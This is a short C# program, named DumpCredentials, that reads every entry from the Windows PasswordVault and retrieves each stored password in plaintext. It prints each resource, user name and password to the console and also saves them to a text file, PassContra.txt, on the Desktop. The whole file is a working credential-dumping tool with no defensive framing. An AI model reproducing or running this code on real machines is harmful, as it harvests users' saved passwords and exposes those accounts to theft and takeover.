using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace DumpCredentials
{
    class Program
      
    {
        static string mydocpath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        static StringBuilder sb = new StringBuilder();
        static void DumpCredentials(Windows.Security.Credentials.PasswordCredential cred)
        {
          
            Console.WriteLine("Resource: {0}", cred.Resource);
            Console.WriteLine("UserName: {0}", cred.UserName);
            Console.WriteLine("Password: {0}", cred.Password);
sb.Append(" Resource: ");
sb.Append(cred.Resource);
         sb.Append(" UserName: ");
         sb.Append( cred.UserName);
         sb.Append(" Password: " );
         sb.Append( cred.Password);
            sb.AppendLine();
            sb.AppendLine();
        }
        static void Main(string[] args)
        {
            Windows.Security.Credentials.PasswordVault vault = new Windows.Security.Credentials.PasswordVault();
            Console.WriteLine("{0}", vault.GetType());
            foreach (var cred in vault.RetrieveAll())
            {
                cred.RetrievePassword();
                DumpCredentials(cred);
            }
            using (StreamWriter outfile = new StreamWriter(mydocpath + @"\PassContra.txt"))
            {
                outfile.Write(sb.ToString());
            }

            Console.ReadLine();

        }
    }
}

